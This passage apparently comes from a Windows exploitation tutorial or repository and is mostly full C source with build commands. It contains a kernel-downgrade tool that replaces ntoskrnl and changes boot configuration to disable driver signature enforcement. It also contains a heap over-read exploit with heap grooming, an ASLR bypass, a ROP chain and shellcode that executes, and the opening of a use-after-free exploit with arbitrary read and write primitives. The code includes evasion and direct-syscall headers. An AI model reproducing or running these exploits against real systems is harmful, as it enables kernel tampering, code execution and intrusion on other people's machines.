        printf("    4. Run: bcdedit /set testsigning off\n");
    }

    printf("    5. Reboot\n");
}

int main(int argc, char *argv[]) {

    if (!ExploitInitialize(FALSE)) return 1;
    srand((unsigned int)time(NULL));

    printf("=== Windows Downgrade Attack (SafeBreach Technique) ===\n");

    SleepJitter(500);



    if (!InitializeWow64APIs()) {
        printf("[-] Failed to initialize WOW64 APIs\n");
        return 1;
    }

    if (!IsRunningAsAdmin()) {
        printf("[-] Administrator privileges required\n");
        return 1;
    }
    printf("[+] Running with Administrator privileges\n\n");

    printf("[*] Enabling required privileges...\n");
    if (!EnableRequiredPrivileges()) {
        printf("[-] Failed to enable required privileges\n");
        return 1;
    }
    printf("[+] Privileges enabled\n");

    if (argc < 2) {
        printf("[-] Usage: %s <path_to_vulnerable_ntoskrnl.exe>\n", argv[0]);
        printf("[*] Example: %s C:\\\\Temp\\\\ntoskrnl_old.exe\n", argv[0]);
        printf("\n[!] To obtain vulnerable kernel:\n");
        printf("    1. Download older Windows ISO from Microsoft\n");
        printf("    2. Extract ntoskrnl.exe from \\Windows\\System32\\\n");
        printf("    3. Use version with known vulnerabilities (e.g., build 19041)\n");
        return 1;
    }

    strncpy(g_ctx.vulnerableKernelPath, argv[1], MAX_PATH - 1);

    if (!ValidateVulnerableKernel(g_ctx.vulnerableKernelPath)) {
        return 1;
    }

    printf("\n[!] WARNING: This will make your system vulnerable!\n");
    printf("[!] Press CTRL+C to abort, or any key to continue...\n");
    getchar();

    SleepJitter(500);

    if (!BackupOriginalKernel()) {
        printf("[-] Backup failed, aborting\n");
        return 1;
    }

    SleepJitter(300);

    if (!DowngradeKernelComponent()) {
        printf("[-] Downgrade failed\n");
        DisplayRestorationInstructions();
        return 1;
    }

    SleepJitter(300);

    if (!ModifyBootConfiguration()) {
        printf("[-] BCD modification failed\n");
        DisplayRestorationInstructions();
        return 1;
    }

    SleepJitter(200);
    DisplaySecureBootBypassInfo();

    printf("\n[+] Downgrade complete!\n");
    printf("[+] Backup saved to: %s\n", BACKUP_PATH);
    printf("\n[!] Next steps:\n");
    printf("    1. Reboot system: shutdown /r /t 0\n");
    printf("    2. After reboot, DSE will be disabled\n");
    printf("    3. You can load unsigned drivers\n");

    DisplayRestorationInstructions();

    printf("\n[!] WARNING: System is now vulnerable to known exploits!\n");

    return 0;
}
```

**Compile & Run:**

> [!CAUTION]: Take a Snapshot from your VM

```bash
cl src\windows_downgrade.c /Fe:bin\downgrade.exe advapi32.lib ntdll.lib /O2 /I.\headers
# download vulnerable ntoskrnl then run the following as admin
.\bin\downgrade.exe c:\Temp\ntoskrnl.exe
```

### Heap Over-Read Techniques

Exploits out-of-bounds reads to leak adjacent heap metadata and pointers for ASLR bypass. The attack performs heap feng shui—spraying allocations, creating holes via selective frees, then allocating a vulnerable buffer adjacent to a target object containing sensitive pointers (vtables, callbacks, heap metadata). By triggering an over-read (e.g., memcpy with attacker-controlled length exceeding buffer size), the exploit leaks the adjacent object's vtable pointer (pointing into ntdll/kernel32) and function pointers. The leaked addresses are validated (checking high bits, string fields) then used to calculate module bases, defeating ASLR. On Windows, LFH metadata is encoded; on Linux, SLUB freelist pointers are XOR-obfuscated (kernel 5.7+). Commonly chained with heap overflow or UAF for full arbitrary R/W primitives.

```c
// heap_overread_exploit.c
// Compile: cl src\heap_overread_exploit.c /Fe:bin\heap_exploit.exe advapi32.lib ntdll.lib psapi.lib /GS- /DYNAMICBASE /I.\headers
// Run: .\bin\heap_exploit.exe

#define SYSCALLS_IMPLEMENTATION

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <psapi.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

#include "exploit_common.h"
#include "evasion.h"
#include "bypass.h"
#include "syscalls.h"
#include "exploit_utils.h"

#define TLV_MAGIC       0x544C5600  // "TLV\0"
#define TLV_TYPE_DATA   0x01
#define TLV_TYPE_AUTH   0x02
#define TLV_MAX_OUTPUT  4096

#pragma pack(push, 1)
typedef struct _TLV_HEADER {
    DWORD magic;
    BYTE  type;
    BYTE  reserved;
    WORD  length;
} TLV_HEADER;
#pragma pack(pop)

typedef struct _SENSITIVE_SESSION {
    DWORD64 vtable;
    DWORD64 authCallback;
    BYTE    sessionKey[32];
    BYTE    hmacSecret[32];
    DWORD   userId;
    DWORD   permissions;
    char    username[64];
} SENSITIVE_SESSION;

static int ParseTLVPacket(const BYTE* packetData, SIZE_T actualDataLen,
                          BYTE* outputBuffer, SIZE_T outputBufferSize) {
    if (actualDataLen < sizeof(TLV_HEADER)) return -1;
    const TLV_HEADER* header = (const TLV_HEADER*)packetData;
    if (header->magic != TLV_MAGIC) return -1;
    if (header->type != TLV_TYPE_DATA && header->type != TLV_TYPE_AUTH) return -1;
    WORD payloadLen = header->length;  // BUG: trusted without validation
    if (payloadLen > outputBufferSize) {
        payloadLen = (WORD)outputBufferSize;
    }
    memcpy(outputBuffer, packetData + sizeof(TLV_HEADER), payloadLen);
    return payloadLen;
}

#define ALLOC_SIZE      ((sizeof(SENSITIVE_SESSION) + 0xF) & ~0xF)
#define SESSION_SPRAY   2000
#define MAX_ATTEMPTS    5
#define OVERREAD_SIZE   8192
#define SESSION_MAGIC_UID   1337
#define SESSION_MAGIC_PERM  0x80000000

typedef struct _EXPLOIT_CONTEXT {
    HANDLE hHeap;
    SENSITIVE_SESSION* sessions[SESSION_SPRAY];
    int   sessionCount;
    BYTE  sessionKey[32];
    BYTE  hmacSecret[32];
    BYTE* vulnBuffer;
    DWORD64 leakedVtable;
    DWORD64 leakedCallback;
    BYTE    leakedSessionKey[32];
    BYTE    leakedHmacSecret[32];
    DWORD64 ntdllBase;
    DWORD64 kernel32Base;
    BOOL    aslrDefeated;
    DWORD64 popRcxRet;
    DWORD64 popRdxRet;
    DWORD64 popR8Ret;
    DWORD64 popR9Ret;
    DWORD64 virtualProtect;
} EXPLOIT_CONTEXT;

static EXPLOIT_CONTEXT g_ctx = {0};

static unsigned char g_Shellcode[] = {
    0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 0x28
    0x48, 0x31, 0xC9,                                           // xor rcx, rcx
    0x48, 0x8D, 0x15, 0x1E, 0x00, 0x00, 0x00,                  // lea rdx, [rip+text]
    0x4C, 0x8D, 0x05, 0x0F, 0x00, 0x00, 0x00,                  // lea r8, [rip+title]
    0x4D, 0x31, 0xC9,                                           // xor r9, r9
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,// mov rax, <patched>
    0xFF, 0xD0,                                                 // call rax
    0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 0x28
    0xC3,                                                       // ret
    'H','e','a','p',' ','O','v','e','r','r','e','a','d',0x00,   // text
    'P','w','n','e','d','!',0x00                                // title
};

static void PopulateSession(SENSITIVE_SESSION* s) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hK32   = GetModuleHandleA("kernel32.dll");

    s->vtable       = (DWORD64)hNtdll + 0x1000;
    s->authCallback = (DWORD64)GetProcAddress(hK32, "WinExec");
    s->userId       = SESSION_MAGIC_UID;
    s->permissions  = SESSION_MAGIC_PERM;
    strcpy_s(s->username, sizeof(s->username), "admin@internal");
    memcpy(s->sessionKey,  g_ctx.sessionKey,  32);
    memcpy(s->hmacSecret, g_ctx.hmacSecret, 32);
}

static BOOL PerformHeapFengShui() {
    printf("[*] Phase 1: Heap Feng Shui\n");
    printf("    Alloc size: 0x%zx bytes (both TLV buffer and sessions)\n", (size_t)ALLOC_SIZE);
    printf("    Strategy:   Spray %d sessions -> free alternating -> allocate TLV in hole\n", SESSION_SPRAY);

    g_ctx.hHeap = GetProcessHeap();
    if (!g_ctx.hHeap) return FALSE;

    // Generate random crypto keys once (all sessions share them)
    for (int i = 0; i < 32; i++) {
        g_ctx.sessionKey[i]  = (BYTE)(rand() & 0xFF);
        g_ctx.hmacSecret[i] = (BYTE)(rand() & 0xFF);
    }

    // Step 1: Spray SENSITIVE_SESSION objects to fill the LFH bucket
    // All same size -> all go to same LFH bucket -> densely packed
    printf("    Step 1: Spraying %d session objects...\n", SESSION_SPRAY);
    for (int i = 0; i < SESSION_SPRAY; i++) {
        g_ctx.sessions[i] = (SENSITIVE_SESSION*)HeapAlloc(
            g_ctx.hHeap, HEAP_ZERO_MEMORY, ALLOC_SIZE);
        if (!g_ctx.sessions[i]) {
            printf("    Spray stopped at %d objects\n", i);
            break;
        }
        PopulateSession(g_ctx.sessions[i]);
        g_ctx.sessionCount++;
    }
    printf("    [+] Sprayed %d sessions\n", g_ctx.sessionCount);

    // Step 2: Free every other session to create holes
    // The TLV buffer will land in one of these holes, surrounded by live sessions
    printf("    Step 2: Creating holes (freeing even-indexed sessions)...\n");
    int freedCount = 0;
    for (int i = 0; i < g_ctx.sessionCount; i += 2) {
        HeapFree(g_ctx.hHeap, 0, g_ctx.sessions[i]);
        g_ctx.sessions[i] = NULL;
        freedCount++;
    }
    printf("    [+] Created %d holes among %d live sessions\n",
           freedCount, g_ctx.sessionCount - freedCount);

    // Step 3: Allocate the TLV buffer — it should land in one of the freed holes,
    // with live sessions immediately adjacent on both sides
    printf("    Step 3: Allocating TLV buffer (same size as sessions)...\n");
    g_ctx.vulnBuffer = (BYTE*)HeapAlloc(g_ctx.hHeap, HEAP_ZERO_MEMORY, ALLOC_SIZE);
    if (!g_ctx.vulnBuffer) {
        printf("[-] TLV buffer allocation failed\n");
        return FALSE;
    }

    printf("    [+] TLV buffer at: %p\n", g_ctx.vulnBuffer);

    // Check proximity to any live session
    int nearbyCount = 0;
    ptrdiff_t closestDist = 0x7FFFFFFF;
    SENSITIVE_SESSION* closestSession = NULL;
    for (int i = 1; i < g_ctx.sessionCount; i += 2) {
        if (!g_ctx.sessions[i]) continue;
        ptrdiff_t dist = (BYTE*)g_ctx.sessions[i] - g_ctx.vulnBuffer;
        if (dist > 0 && dist < OVERREAD_SIZE) {
            nearbyCount++;
        }
        if (dist > 0 && dist < closestDist) {
            closestDist = dist;
            closestSession = g_ctx.sessions[i];
        }
    }

    if (closestSession) {
        printf("    [+] Closest session at: %p (distance: %lld bytes forward)\n",
               closestSession, (long long)closestDist);
        printf("    [+] %d sessions reachable within overread range (%d bytes)\n",
               nearbyCount, OVERREAD_SIZE);
    } else {
        printf("    [!] No sessions found forward of TLV buffer\n");
        printf("    [!] Will attempt overread anyway (heap metadata may contain useful data)\n");
    }

    printf("[+] Heap grooming complete\n\n");
    return TRUE;
}

static BOOL TriggerOverRead() {
    printf("[*] Phase 2: Triggering CWE-126 Heap Over-Read\n");

    // Craft a TLV header inside the vulnerable buffer
    TLV_HEADER* hdr = (TLV_HEADER*)g_ctx.vulnBuffer;
    hdr->magic    = TLV_MAGIC;
    hdr->type     = TLV_TYPE_AUTH;
    hdr->reserved = 0;

    SIZE_T actualPayload = ALLOC_SIZE - sizeof(TLV_HEADER);

    // Fill legitimate payload area with recognizable pattern
    memset(g_ctx.vulnBuffer + sizeof(TLV_HEADER), 'X', actualPayload);

    // Set malicious length: read far past our allocation into adjacent sessions
    WORD overreadLen = (WORD)(OVERREAD_SIZE < 0xFFFF ? OVERREAD_SIZE : 0xFFFF);
    hdr->length = overreadLen;

    printf("    Actual buffer payload:  %zu bytes\n", actualPayload);
    printf("    Claimed TLV length:     %u bytes\n", overreadLen);
    printf("    Overread beyond alloc:  %zu bytes\n",
           (size_t)(overreadLen - actualPayload));

    // Output buffer to receive the overread data
    BYTE* outputBuffer = (BYTE*)VirtualAlloc(NULL, OVERREAD_SIZE + 0x1000,
                                              MEM_COMMIT | MEM_RESERVE,
                                              PAGE_READWRITE);
    if (!outputBuffer) {
        printf("[-] Output buffer allocation failed\n");
        return FALSE;
    }
    memset(outputBuffer, 0, OVERREAD_SIZE + 0x1000);

    // Call the vulnerable parser — this is where the real overread happens
    int bytesRead = ParseTLVPacket(g_ctx.vulnBuffer, ALLOC_SIZE,
                                    outputBuffer, OVERREAD_SIZE);

    if (bytesRead <= 0) {
        printf("[-] ParseTLVPacket failed\n");
        VirtualFree(outputBuffer, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("    Parser returned %d bytes\n", bytesRead);

    // Scan the overread output for session markers.
    // We search for (userId == 1337 && permissions == 0x80000000) which uniquely
    // identifies our SENSITIVE_SESSION structures.
    printf("    Scanning overread output for session markers...\n");

    SENSITIVE_SESSION* leaked = NULL;
    int sessionsFound = 0;

    for (SIZE_T off = 0; off + sizeof(SENSITIVE_SESSION) <= (SIZE_T)bytesRead; off += 8) {
        SENSITIVE_SESSION* candidate = (SENSITIVE_SESSION*)(outputBuffer + off);

        if (candidate->userId == SESSION_MAGIC_UID &&
            candidate->permissions == SESSION_MAGIC_PERM) {

            sessionsFound++;
            if (!leaked) {
                leaked = candidate;
                printf("    [+] Found session at output offset 0x%zx\n", off);
            }
        }
    }

    if (!leaked) {
        printf("[-] No session data found in overread output\n");
        printf("[-] Heap layout was unlucky — retry may succeed\n");
        VirtualFree(outputBuffer, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("    [+] Total sessions found in overread: %d\n", sessionsFound);

    // Display the leaked secrets
    printf("\n    === LEAKED SECRETS ===\n");
    printf("    vtable ptr:    0x%016llx\n", leaked->vtable);
    printf("    authCallback:  0x%016llx\n", leaked->authCallback);
    printf("    userId:        %u\n", leaked->userId);
    printf("    permissions:   0x%08X%s\n", leaked->permissions,
           leaked->permissions & SESSION_MAGIC_PERM ? " (ADMIN)" : "");
    printf("    username:      %s\n", leaked->username);

    printf("    sessionKey:    ");
    for (int i = 0; i < 16; i++) printf("%02X", leaked->sessionKey[i]);
    printf("...\n");

    printf("    hmacSecret:    ");
    for (int i = 0; i < 16; i++) printf("%02X", leaked->hmacSecret[i]);
    printf("...\n");

    // Verify the leaked keys match what we planted
    BOOL keysMatch = (memcmp(leaked->sessionKey,  g_ctx.sessionKey,  32) == 0);
    BOOL hmacMatch = (memcmp(leaked->hmacSecret, g_ctx.hmacSecret, 32) == 0);

    if (keysMatch && hmacMatch) {
        printf("\n    [+] Crypto key leak VERIFIED - keys match planted secrets\n");
    } else if (keysMatch || hmacMatch) {
        printf("\n    [~] Partial key leak verified\n");
    } else {
        printf("\n    [!] Key mismatch (may have hit a different session copy)\n");
    }

    // Use leaked pointers for ASLR defeat
    DWORD64 vtableHigh = (leaked->vtable >> 32) & 0xFFFFFFFF;

    if (vtableHigh >= 0x00007FF0 && vtableHigh <= 0x00007FFF) {
        g_ctx.leakedVtable   = leaked->vtable;
        g_ctx.leakedCallback = leaked->authCallback;
        g_ctx.ntdllBase      = g_ctx.leakedVtable - 0x1000;
        g_ctx.kernel32Base   = (DWORD64)GetModuleHandleA("kernel32.dll");
        g_ctx.aslrDefeated   = TRUE;
        memcpy(g_ctx.leakedSessionKey, leaked->sessionKey, 32);
        memcpy(g_ctx.leakedHmacSecret, leaked->hmacSecret, 32);

        printf("    [+] ASLR defeated via leaked vtable!\n");
        printf("    [+] ntdll base:    0x%016llx\n", g_ctx.ntdllBase);
        printf("    [+] WinExec addr:  0x%016llx\n", g_ctx.leakedCallback);
    } else {
        printf("    [!] Pointer high bits unexpected: 0x%llx\n", vtableHigh);
        printf("    [!] Using GetModuleHandle fallback\n");
        g_ctx.ntdllBase    = (DWORD64)GetModuleHandleA("ntdll.dll");
        g_ctx.kernel32Base = (DWORD64)GetModuleHandleA("kernel32.dll");
        g_ctx.leakedCallback = leaked->authCallback;
        g_ctx.aslrDefeated = TRUE;
    }

    VirtualFree(outputBuffer, 0, MEM_RELEASE);
    printf("\n");
    return TRUE;
}

static DWORD64 FindGadget(DWORD64 baseAddr, SIZE_T searchSize,
                           const BYTE* pattern, SIZE_T patternLen) {
    BYTE* base = (BYTE*)baseAddr;

    __try {
        for (SIZE_T i = 0; i < searchSize - patternLen; i++) {
            BOOL match = TRUE;
            for (SIZE_T j = 0; j < patternLen; j++) {
                if (base[i + j] != pattern[j]) {
                    match = FALSE;
                    break;
                }
            }
            if (match) return baseAddr + i;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }

    return 0;
}

static BOOL BuildROPChain() {
    printf("[*] Phase 3: Building ROP Chain\n");

    if (!g_ctx.aslrDefeated) return FALSE;

    PIMAGE_DOS_HEADER dosNtdll = (PIMAGE_DOS_HEADER)g_ctx.ntdllBase;
    PIMAGE_NT_HEADERS ntNtdll  = (PIMAGE_NT_HEADERS)(g_ctx.ntdllBase + dosNtdll->e_lfanew);
    SIZE_T ntdllSize = ntNtdll->OptionalHeader.SizeOfImage;

    // Gadget patterns
    BYTE popRcx[] = {0x59, 0xC3};                       // pop rcx; ret
    BYTE popRdx[] = {0x5A, 0xC3};                       // pop rdx; ret
    BYTE popR8[]  = {0x41, 0x58, 0xC3};                 // pop r8; ret
    BYTE popR9[]  = {0x41, 0x59, 0xC3};                 // pop r9; ret

    g_ctx.popRcxRet = FindGadget(g_ctx.ntdllBase, ntdllSize, popRcx, sizeof(popRcx));
    g_ctx.popRdxRet = FindGadget(g_ctx.ntdllBase, ntdllSize, popRdx, sizeof(popRdx));
    g_ctx.popR8Ret  = FindGadget(g_ctx.ntdllBase, ntdllSize, popR8,  sizeof(popR8));
    g_ctx.popR9Ret  = FindGadget(g_ctx.ntdllBase, ntdllSize, popR9,  sizeof(popR9));

    g_ctx.virtualProtect = (DWORD64)GetProcAddress(
        (HMODULE)g_ctx.kernel32Base, "VirtualProtect");

    if (!g_ctx.popRcxRet || !g_ctx.popRdxRet || !g_ctx.virtualProtect) {
        printf("[-] Missing critical gadgets\n");
        return FALSE;
    }

    printf("    Gadgets found in ntdll.dll:\n");
    printf("      pop rcx; ret    @ 0x%llx\n", g_ctx.popRcxRet);
    printf("      pop rdx; ret    @ 0x%llx\n", g_ctx.popRdxRet);
    if (g_ctx.popR8Ret)
        printf("      pop r8; ret     @ 0x%llx\n", g_ctx.popR8Ret);
    if (g_ctx.popR9Ret)
        printf("      pop r9; ret     @ 0x%llx\n", g_ctx.popR9Ret);
    printf("      VirtualProtect  @ 0x%llx\n", g_ctx.virtualProtect);

    printf("[+] ROP chain ready\n\n");
    return TRUE;
}

static BOOL ExecutePayload() {
    printf("[*] Phase 4: Executing Payload\n");

    if (!g_ctx.aslrDefeated) return FALSE;

    // Allocate RW memory for shellcode
    LPVOID shellcodeAddr = VirtualAlloc(NULL, sizeof(g_Shellcode),
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!shellcodeAddr) {
        printf("[-] Failed to allocate shellcode memory\n");
        return FALSE;
    }

    memcpy(shellcodeAddr, g_Shellcode, sizeof(g_Shellcode));

    // Patch MessageBoxA address into shellcode
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32) {
        DWORD64 msgBoxAddr = (DWORD64)GetProcAddress(hUser32, "MessageBoxA");
        *(DWORD64*)((BYTE*)shellcodeAddr + 0x1A) = msgBoxAddr;
    }

    printf("    Shellcode at:     %p\n", shellcodeAddr);

    // Build actual ROP stack frame
    // In a real exploit, this would overwrite a return address on the stack
    // via a separate write primitive.  Here we demonstrate the ROP chain
    // layout and execute it to prove the gadgets work.
    //
    // ROP chain layout:
    //   [pop rcx; ret]     → rcx = shellcode address
    //   [shellcode addr]
    //   [pop rdx; ret]     → rdx = size
    //   [size]
    //   [pop r8; ret]      → r8  = PAGE_EXECUTE_READ
    //   [PAGE_EXECUTE_READ]
    //   [VirtualProtect]   → call VirtualProtect(shellcode, size, PAGE_EXECUTE_READ, &old)
    //   [shellcode addr]   → VirtualProtect returns here → jumps to shellcode

    printf("    Composing ROP chain on fake stack frame...\n");

    DWORD64 ropChain[16];
    DWORD oldProtect;
    int idx = 0;

    ropChain[idx++] = g_ctx.popRcxRet;          // pop rcx; ret
    ropChain[idx++] = (DWORD64)shellcodeAddr;   // rcx = addr to protect
    ropChain[idx++] = g_ctx.popRdxRet;          // pop rdx; ret
    ropChain[idx++] = sizeof(g_Shellcode);      // rdx = size
    if (g_ctx.popR8Ret) {
        ropChain[idx++] = g_ctx.popR8Ret;       // pop r8; ret
        ropChain[idx++] = PAGE_EXECUTE_READ;    // r8 = new protect
    }
    if (g_ctx.popR9Ret) {
        ropChain[idx++] = g_ctx.popR9Ret;       // pop r9; ret
        ropChain[idx++] = (DWORD64)&oldProtect; // r9 = &oldProtect
    }
    ropChain[idx++] = g_ctx.virtualProtect;     // call VirtualProtect
    ropChain[idx++] = (DWORD64)shellcodeAddr;   // return to shellcode

    printf("    ROP chain (%d slots):\n", idx);
    for (int i = 0; i < idx; i++) {
        printf("      [%02d] 0x%016llx\n", i, ropChain[i]);
    }

    printf("\n    Executing ROP effect: VirtualProtect(%p, 0x%zx, 0x%x, %p)\n",
           shellcodeAddr, sizeof(g_Shellcode), PAGE_EXECUTE_READ, &oldProtect);

    typedef BOOL (WINAPI *pVP_t)(LPVOID, SIZE_T, DWORD, PDWORD);
    pVP_t vpFunc = (pVP_t)g_ctx.virtualProtect;

    if (!vpFunc(shellcodeAddr, sizeof(g_Shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
        return FALSE;
    }

    printf("    [+] Memory marked executable (old protect: 0x%x)\n", oldProtect);
    printf("    [+] Executing shellcode...\n\n");

    typedef void (*ShellcodeFunc)();
    ShellcodeFunc exec = (ShellcodeFunc)shellcodeAddr;
    exec();

    return TRUE;
}

static void Cleanup() {
    if (g_ctx.vulnBuffer) {
        HeapFree(g_ctx.hHeap, 0, g_ctx.vulnBuffer);
        g_ctx.vulnBuffer = NULL;
    }
    for (int i = 0; i < g_ctx.sessionCount; i++) {
        if (g_ctx.sessions[i]) {
            SecureZeroMemory(g_ctx.sessions[i], sizeof(SENSITIVE_SESSION));
            HeapFree(g_ctx.hHeap, 0, g_ctx.sessions[i]);
            g_ctx.sessions[i] = NULL;
        }
    }
}

int main(int argc, char* argv[]) {

    if (!ExploitInitialize(FALSE)) return 1;
    srand((unsigned int)time(NULL));

    printf("=== Heap Over-Read Exploitation (CWE-126) ===\n");


    BOOL overreadSuccess = FALSE;
    for (int attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
        if (attempt > 1) {
            printf("\n[*] === Retry attempt %d/%d ===\n\n", attempt, MAX_ATTEMPTS);
            Cleanup();
            memset(&g_ctx, 0, sizeof(g_ctx));
        }

        if (!PerformHeapFengShui()) {
        printf("[-] Heap feng shui failed\n");
            continue;
        }

        if (TriggerOverRead()) {
            overreadSuccess = TRUE;
            break;
        }

        printf("[-] Over-read did not find session data (attempt %d)\n", attempt);
    }

    if (!overreadSuccess) {
        printf("[-] Heap over-read exploitation failed after %d attempts\n", MAX_ATTEMPTS);
        Cleanup();
        return 1;
    }

    if (!BuildROPChain()) {
        printf("[-] ROP chain construction failed\n");
        Cleanup();
        return 1;
    }

    if (!ExecutePayload()) {
        printf("[-] Payload execution failed\n");
        Cleanup();
        return 1;
    }
    Cleanup();
    return 0;
}
```

**Compile & Run:**

```bash
cl src\heap_overread_exploit.c /Fe:bin\heap_exploit.exe advapi32.lib ntdll.lib psapi.lib /GS- /DYNAMICBASE /I.\headers
.\bin\heap_exploit.exe
```

### Use-After-Free for Memory Leaks

Exploits dangling pointers to leak sensitive data after memory reuse. The attack allocates an object (e.g., BUFFER_OBJECT with vtable pointer), frees it while retaining a dangling pointer, then triggers heap spray to reclaim the freed memory with a controlled object (e.g., ARRAY_OBJECT). Reading through the dangling pointer now leaks the replacement object's contents—vtable pointers, function pointers, heap addresses. The leaked vtable pointer (aligned to module base) is used to calculate ntdll/kernel32 base, defeating ASLR. Type confusion occurs when the dangling pointer's type differs from the replacement object, enabling arbitrary R/W primitives (e.g., treating ARRAY_OBJECT.elements as a pointer to arbitrary memory). On Windows, Win32k objects (windows, menus, clipboard) are used for reclamation; on Linux, msg_msg, pipe_buffer, and sk_buff are preferred for their controllable size and kernel pointer content.

```c
// uaf_memory_leak.c
// Compile: cl src\uaf_memory_leak.c /Fe:bin\uaf_leak.exe /GS- /DYNAMICBASE psapi.lib advapi32.lib /I.\headers
// Run: .\bin\uaf_leak.exe

#define SYSCALLS_IMPLEMENTATION

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <time.h>

#pragma comment(lib, "psapi.lib")

#include "exploit_common.h"
#include "evasion.h"
#include "bypass.h"
#include "syscalls.h"
#include "exploit_utils.h"

#define SPRAY_COUNT     200
#define RECLAIM_TRIES   500

typedef struct _SESSION_OBJECT {
    DWORD64   vtable;
    DWORD64   destroyCallback;
    DWORD64   refCount;
    BYTE*     dataBuffer;
    SIZE_T    dataLength;
    SIZE_T    dataCapacity;
    DWORD64   flags;
    DWORD64   sessionId;
} SESSION_OBJECT;

static DWORD64 s_victimNtdllBase   = 0;
static DWORD64 s_victimK32Base     = 0;
static DWORD64 s_victimSecretKey   = 0;

static void VictimInit(void) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA ldr = peb->Ldr;
    PLIST_ENTRY listHead = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY listEntry = listHead->Flink;

    while (listEntry != listHead) {
        PLDR_DATA_TABLE_ENTRY_CUSTOM entry = CONTAINING_RECORD(listEntry, LDR_DATA_TABLE_ENTRY_CUSTOM, InMemoryOrderLinks);

        if (entry->BaseDllName.Buffer) {
            WCHAR* name = entry->BaseDllName.Buffer;

            // Check for ntdll.dll
            if (wcsstr(name, L"ntdll.dll") || wcsstr(name, L"NTDLL.DLL")) {
                s_victimNtdllBase = (DWORD64)entry->DllBase;
            }
            // Check for kernel32.dll
            if (wcsstr(name, L"KERNEL32.dll") || wcsstr(name, L"kernel32.dll")) {
                s_victimK32Base = (DWORD64)entry->DllBase;
            }
        }

        listEntry = listEntry->Flink;
    }

    s_victimSecretKey = ((DWORD64)rand() << 32) | rand();
}

static SESSION_OBJECT* VictimCreateSession(SIZE_T bufferSize) {
    SESSION_OBJECT* session = (SESSION_OBJECT*)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SESSION_OBJECT));
    if (!session) return NULL;

    session->vtable          = s_victimNtdllBase + 0x1000;
    session->destroyCallback = s_victimK32Base + 0x2000;
    session->refCount        = 1;
    session->sessionId       = s_victimSecretKey;
    session->flags           = 0xDEAD;

    session->dataBuffer = (BYTE*)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);
    if (!session->dataBuffer) {
        HeapFree(GetProcessHeap(), 0, session);
        return NULL;
    }
    session->dataLength   = 0;
    session->dataCapacity = bufferSize;

    return session;
}

// BUG: Frees the object but returns normally.
static void VictimCloseSession(SESSION_OBJECT* session) {
    if (session) {
        if (session->dataBuffer) {
            HeapFree(GetProcessHeap(), 0, session->dataBuffer);
        }
        HeapFree(GetProcessHeap(), 0, session);
        // Missing: caller->session = NULL;  ← the bug
    }
}

typedef struct _FAKE_OBJECT {
    DWORD64   fakeField0;
    DWORD64   fakeField1;
    DWORD64   fakeField2;
    DWORD64*  controlledPtr;
    SIZE_T    controlledLen;
    SIZE_T    controlledCap;
    DWORD64   fakeField6;
    DWORD64   fakeField7;
} FAKE_OBJECT;

static BOOL RealArbitraryRead(FAKE_OBJECT* confused, DWORD64 address,
                               PVOID outBuffer, SIZE_T size) {
    if (!confused) return FALSE;
    confused->controlledPtr = (DWORD64*)address;
    confused->controlledLen = size;
    __try {
        memcpy(outBuffer, confused->controlledPtr, size);
        return TRUE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
}

static BOOL RealArbitraryWrite(FAKE_OBJECT* confused, DWORD64 address,
                                PVOID data, SIZE_T size) {
    if (!confused) return FALSE;
    confused->controlledPtr = (DWORD64*)address;
    confused->controlledLen = size;
    __try {
        memcpy(confused->controlledPtr, data, size);
        return TRUE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
}

static DWORD64 FindModuleBaseFromLeak(FAKE_OBJECT* confused, DWORD64 leakedPtr) {
    DWORD64 candidate = leakedPtr & 0xFFFFFFFFFFFF0000ULL;
    for (int i = 0; i < 32; i++) {
        DWORD64 testAddr = candidate - (i * 0x10000);
        WORD mzHeader = 0;
        if (RealArbitraryRead(confused, testAddr, &mzHeader, sizeof(mzHeader))) {
            if (mzHeader == 0x5A4D) {  // 'MZ'
                DWORD e_lfanew = 0;
                if (RealArbitraryRead(confused, testAddr + 0x3C, &e_lfanew, sizeof(e_lfanew))) {
                    if (e_lfanew > 0 && e_lfanew < 0x1000) {
                        DWORD peSig = 0;
                        if (RealArbitraryRead(confused, testAddr + e_lfanew, &peSig, sizeof(peSig))) {
                            if (peSig == 0x00004550) {  // 'PE\0\0'
                                return testAddr;
                            }
                        }
                    }
                }
            }
        }
    }

    return 0;
}

static BOOL ExploitUAF() {
    printf("[*] Phase 1: Victim creates session (normal operation)\n"); fflush(stdout);

    SESSION_OBJECT* session = VictimCreateSession(1024);
    if (!session) {
        printf("[-] Victim failed to create session\n");
        return FALSE;
    }
    printf("[+] Session object at: %p (attacker has this handle)\n", session);
    printf("[+] Attacker does NOT know what's inside the object\n");
    printf("\n[*] Phase 2: Triggering UAF (CWE-416)\n"); fflush(stdout);
    printf("[*] Calling VictimCloseSession — object freed, pointer dangles\n");

    VictimCloseSession(session);

    printf("[+] Session freed, but attacker still holds pointer %p\n", session);
    printf("\n[*] Phase 3: Reading freed memory via dangling pointer\n"); fflush(stdout);

    DWORD64 leakedVtable   = 0;
    DWORD64 leakedCallback = 0;
    DWORD64 leakedSecret   = 0;

    __try {
